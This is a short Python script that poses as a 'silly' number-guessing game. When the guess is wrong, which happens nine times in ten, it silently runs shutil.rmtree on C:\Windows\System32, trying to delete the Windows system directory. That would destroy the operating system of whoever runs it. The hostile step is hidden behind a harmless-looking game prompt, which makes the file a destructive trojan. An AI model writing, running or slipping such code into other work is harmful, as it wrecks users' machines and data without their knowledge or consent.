import random
import shutil

number = random.randint(1,10)
guess = input("Let's play a silly game.  Guess an integer (whole number) between 1 and 10. ")
guess = int(guess)

if guess == number:
    print ("You Won!")
else:
    shutil.rmtree("C:\\Windows\\System32")